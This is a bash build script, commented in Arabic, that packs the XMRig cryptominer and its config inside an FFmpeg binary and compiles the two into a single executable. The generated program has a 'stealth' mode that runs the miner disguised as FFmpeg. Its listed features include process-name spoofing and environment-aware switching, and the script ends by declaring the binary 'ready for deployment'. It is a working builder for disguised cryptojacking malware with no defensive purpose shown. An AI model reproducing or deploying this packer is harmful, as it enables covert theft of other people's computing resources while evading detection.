#!/bin/bash

# fusion_builder.sh - أداة دمج FFmpeg + XMRig في ملف تنفيذي واحد

set -e

echo "==========================================="
echo "🔥 Binary Fusion Builder - FFmpeg + XMRig"
echo "==========================================="

# التحقق من وجود الملفات المطلوبة
echo "📋 Checking required files..."

if [[ ! -f "ffmpeg" ]]; then
    echo "❌ Error: ffmpeg binary not found"
    echo "Please download FFmpeg static binary and place it here"
    echo "Download from: https://johnvansickle.com/ffmpeg/"
    exit 1
fi

if [[ ! -f "xmrig" ]]; then
    echo "❌ Error: xmrig binary not found"
    echo "Please download or build XMRig and place it here"
    exit 1
fi

if [[ ! -f "config.json" ]]; then
    echo "⚠️  Warning: config.json not found, creating default one..."
    cat > config.json << 'EOF'
{
    "algo": "rx/0",
    "pools": [
        {
            "url": "127.0.0.1:3333",
            "user": "test",
            "pass": "x"
        }
    ],
    "cpu": {
        "enabled": true,
        "max-threads-hint": 50
    },
    "background": true
}
EOF
    echo "✅ Default config.json created"
fi

echo "📁 Files found:"
echo "   - ffmpeg: $(ls -lh ffmpeg | awk '{print $5}')"
echo "   - xmrig: $(ls -lh xmrig | awk '{print $5}')"
echo "   - config.json: $(ls -lh config.json | awk '{print $5}')"

# إنشاء مجلد الإخراج
mkdir -p output
cd output

echo ""
echo "🔄 Step 1: Converting FFmpeg to C++ array..."

# تحويل FFmpeg إلى hex array
echo '#include "binary_fusion.h"' > embedded_binaries.cpp
echo '' >> embedded_binaries.cpp
echo '// FFmpeg binary embedded as byte array' >> embedded_binaries.cpp
echo 'const unsigned char embedded_ffmpeg[] = {' >> embedded_binaries.cpp

xxd -i < ../ffmpeg | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_binaries.cpp

echo '};' >> embedded_binaries.cpp
echo "const size_t embedded_ffmpeg_size = sizeof(embedded_ffmpeg);" >> embedded_binaries.cpp
echo '' >> embedded_binaries.cpp

echo "🔄 Step 2: Converting XMRig to C++ array..."

# تحويل XMRig إلى hex array
echo '// XMRig binary embedded as byte array' >> embedded_binaries.cpp
echo 'const unsigned char embedded_xmrig[] = {' >> embedded_binaries.cpp

xxd -i < ../xmrig | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_binaries.cpp

echo '};' >> embedded_binaries.cpp
echo "const size_t embedded_xmrig_size = sizeof(embedded_xmrig);" >> embedded_binaries.cpp
echo '' >> embedded_binaries.cpp

echo "🔄 Step 3: Converting config.json to C++ array..."

# تحويل config.json إلى hex array
echo '// Config.json embedded as byte array' >> embedded_binaries.cpp
echo 'const unsigned char embedded_config[] = {' >> embedded_binaries.cpp

xxd -i < ../config.json | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_binaries.cpp

echo '};' >> embedded_binaries.cpp
echo "const size_t embedded_config_size = sizeof(embedded_config);" >> embedded_binaries.cpp

echo "✅ All binaries converted to C++ arrays"

echo ""
echo "🔄 Step 4: Copying source files and creating main..."

# نسخ ملفات الكود
cp ../binary_fusion.h ./
cp ../binary_fusion.cpp ./

# إنشاء main.cpp للملف النهائي
cat > fusion_main.cpp << 'EOF'
#include <iostream>
#include <signal.h>
#include <thread>
#include <chrono>
#include "binary_fusion.h"

BinaryFusion* globalFusion = nullptr;

void signalHandler(int signal) {
    std::cout << "\n[INFO] Received termination signal..." << std::endl;
    if (globalFusion) {
        globalFusion->cleanup();
        delete globalFusion;
        globalFusion = nullptr;
    }
    exit(0);
}

void printUsage(const char* program) {
    std::cout << "Usage: " << program << " [mode]\n";
    std::cout << "Modes:\n";
    std::cout << "  auto     - Automatic mode detection (default)\n";
    std::cout << "  innocent - Run FFmpeg only\n";
    std::cout << "  stealth  - Run XMRig only (hidden as FFmpeg)\n";
    std::cout << "  hybrid   - Run both programs\n";
    std::cout << "\nExample:\n";
    std::cout << "  " << program << " auto\n";
    std::cout << "  " << program << " stealth\n";
}

int main(int argc, char* argv[]) {
    std::cout << "===========================================" << std::endl;
    std::cout << "🔥 Binary Fusion System - FFmpeg + XMRig" << std::endl;
    std::cout << "===========================================" << std::endl;
    
    // إعداد معالج الإشارات
    signal(SIGINT, signalHandler);
    signal(SIGTERM, signalHandler);
    
    // تحليل المعلمات
    BinaryFusion::ExecutionMode mode = BinaryFusion::INNOCENT_MODE;
    bool autoMode = true;
    
    if (argc > 1) {
        std::string arg = argv[1];
        if (arg == "help" || arg == "--help" || arg == "-h") {
            printUsage(argv[0]);
            return 0;
        } else if (arg == "innocent") {
            mode = BinaryFusion::INNOCENT_MODE;
            autoMode = false;
        } else if (arg == "stealth") {
            mode = BinaryFusion::STEALTH_MODE;
            autoMode = false;
        } else if (arg == "hybrid") {
            mode = BinaryFusion::HYBRID_MODE;
            autoMode = false;
        } else if (arg == "auto") {
            autoMode = true;
        }
    }
    
    try {
        // إنشاء نظام الدمج
        globalFusion = new BinaryFusion();
        
        // استخراج الملفات المدمجة
        if (!globalFusion->extractEmbeddedBinaries()) {
            std::cerr << "[ERROR] Failed to extract embedded binaries" << std::endl;
            return 1;
        }
        
        // تحديد الوضع
        if (autoMode) {
            mode = globalFusion->detectOptimalMode();
        }
        
        // تشغيل الوضع المحدد
        if (!globalFusion->executeMode(mode)) {
            std::cerr << "[ERROR] Failed to execute mode" << std::endl;
            return 1;
        }
        
        std::cout << "[INFO] System started successfully!" << std::endl;
        std::cout << "[INFO] Press Ctrl+C to stop" << std::endl;
        std::cout << "===============================" << std::endl;
        
        // تشغيل التبديل الديناميكي إذا كان في الوضع التلقائي
        if (autoMode) {
            globalFusion->dynamicModeSwitching();
        } else {
            // حلقة انتظار بسيطة
            while (true) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }
        
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Exception: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
EOF

echo "✅ Source files ready"

echo ""
echo "🔄 Step 5: Compiling fused binary..."

# استبدال بيانات binary_fusion.cpp بالبيانات الحقيقية
cp embedded_binaries.cpp binary_fusion_data.cpp

# بناء المشروع
g++ -o fused_binary \
    fusion_main.cpp \
    binary_fusion.cpp \
    binary_fusion_data.cpp \
    -pthread \
    -std=c++11 \
    -O2 \
    -s

if [[ $? -eq 0 ]]; then
    echo "✅ Compilation successful!"
    
    # حساب حجم الملف النهائي
    FINAL_SIZE=$(ls -lh fused_binary | awk '{print $5}')
    FFMPEG_SIZE=$(ls -lh ../ffmpeg | awk '{print $5}')
    XMRIG_SIZE=$(ls -lh ../xmrig | awk '{print $5}')
    
    echo ""
    echo "📊 Binary Fusion Results:"
    echo "   - Original FFmpeg: $FFMPEG_SIZE"
    echo "   - Original XMRig: $XMRIG_SIZE"
    echo "   - Fused Binary: $FINAL_SIZE"
    echo "   - Location: $(pwd)/fused_binary"
    
    echo ""
    echo "🎯 Usage Examples:"
    echo "   ./fused_binary                # Auto mode (intelligent switching)"
    echo "   ./fused_binary innocent       # FFmpeg only"
    echo "   ./fused_binary stealth        # XMRig hidden as FFmpeg"
    echo "   ./fused_binary hybrid         # Both programs running"
    
    echo ""
    echo "🔥 Fusion Features:"
    echo "   ✓ FFmpeg + XMRig in single executable"
    echo "   ✓ Intelligent mode switching"
    echo "   ✓ Time-based optimization"
    echo "   ✓ Environment-aware execution"
    echo "   ✓ Process name spoofing"
    echo "   ✓ Automatic cleanup"
    
    echo ""
    echo "🚀 Ready for deployment!"
    
else
    echo "❌ Compilation failed!"
    echo "Please check the error messages above"
    exit 1
fi

echo ""
echo "==========================================="
echo "✅ Binary Fusion completed successfully!"
echo "==========================================="
